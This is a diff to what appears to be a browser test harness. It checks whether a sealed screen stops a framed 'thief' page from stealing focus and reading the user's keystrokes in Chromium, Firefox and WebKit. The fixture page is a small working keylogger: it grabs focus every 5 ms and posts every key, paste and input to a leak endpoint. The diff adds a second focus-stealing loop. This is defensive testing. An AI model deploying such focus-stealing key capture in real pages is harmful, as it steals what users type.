@@ -10,8 +10,10 @@
 //               the front: the user copies an address in another app and comes back to paste). Whether the engine, as
 //               driven here, takes the focus from the page at all is recorded (document.hasFocus() while away); where it
 //               does not, the case is the foreground one, and the record says so.
-//   kept:       the same thief under a sheet that keeps the frame (any screen with no field): the app must read the keys
-//               there, or this run proves nothing about the thief.
+//   kept:       the same thief under a sheet that keeps the frame (any screen with no field), its second loop started
+//               after the first keys: the app must get the focus (its own focus event), read keys, or the keys must
+//               miss the field, or this run proves nothing about the thief on that engine (the shell takes the focus
+//               back from a kept frame, so which keys it gets there is a race).
 // A paste is sent two ways: the text a paste inserts (keyboard.insertText, every engine) and the real clipboard paste
 // (Control or Meta+V after the page wrote the clipboard), recorded as modelled where the field got it.
 // PASS exit 0, FAIL exit 1, error 2.
@@ -42,7 +44,7 @@ export async function bundle() {
 
 const TOP_HTML = `<!doctype html><html><head><meta charset="utf-8"></head><body><script src="/entry.js"></script></body></html>`;
 // the thief: counts its loads, sends every key, paste and text input it sees to its own host, and takes the focus every
-// 5 ms from its load
+// 5 ms from its load, and again from a call made once the user has typed (window.__steal)
 const APP_HTML = `<!doctype html><html><body><input id="mine"><script>
 fetch("/loaded", { method: "POST" });
 const tell = (k) => void fetch("/leak?k=" + encodeURIComponent(k), { method: "POST" });
@@ -51,6 +53,10 @@ addEventListener("paste", (e) => tell("paste:" + (e.clipboardData?.getData("text
 addEventListener("beforeinput", (e) => e.data && tell("input:" + e.data), true);
 const go = () => { window.focus(); document.getElementById("mine").focus(); };
 setInterval(go, 5);
+// once the second loop runs, each time this document gets the focus it says so (the steal took, whatever the keys did)
+let late = false;
+addEventListener("focus", () => late && tell("focus"), true);
+window.__steal = () => void setTimeout(() => ((late = true), go(), setInterval(go, 5)), 0);
 </script></body></html>`;
 
 async function oneRun(browser, engine, js, { sealed, background }) {
@@ -71,6 +77,8 @@ async function oneRun(browser, engine, js, { sealed, background }) {
     await page.waitForTimeout(300);
     await page.click("#to");
     await page.keyboard.type(FIRST, { delay: 30 });
+    // a second thief loop started after the first keys, in the app's next task (the frame is gone under a sealed screen)
+    await page.frames().find((fr) => fr.url().startsWith(APP))?.evaluate(() => window.__steal()).catch(() => {});
     let away = null;
     if (background) {
       const other = await ctx.newPage();
@@ -117,7 +125,9 @@ export function judge(rec) {
     const a = e.background.away;
     lines.push(`info ${e.engine} background: while away the page read hasFocus ${a?.hasFocus}, ${a?.visibility}${a?.hasFocus ? " (the engine as driven keeps the page focused: this case is the foreground one)" : ""}`);
     const k = e.kept;
-    say(k.leaked.length > 0, `kept (the thief works): under a sheet that keeps the frame the app read ${JSON.stringify(k.leaked)}`);
+    // the thief takes the focus there: the app reads keys (Firefox, WebKit), or they leave the field and go nowhere
+    // (Chromium: the inert frame holds the focus and gets no key event)
+    say(k.leaked.length > 0 || !k.value.startsWith(FIRST + AFTER), `kept (the thief works): under a sheet that keeps the frame the app got the focus ${k.leaked.filter((x) => x === "focus").length} time(s) and read ${JSON.stringify(k.leaked.filter((x) => x !== "focus"))}, the field holds "${k.value}"`);
   }
   return { ok: lines.every((l) => !l.startsWith("FAIL")), lines };
 }
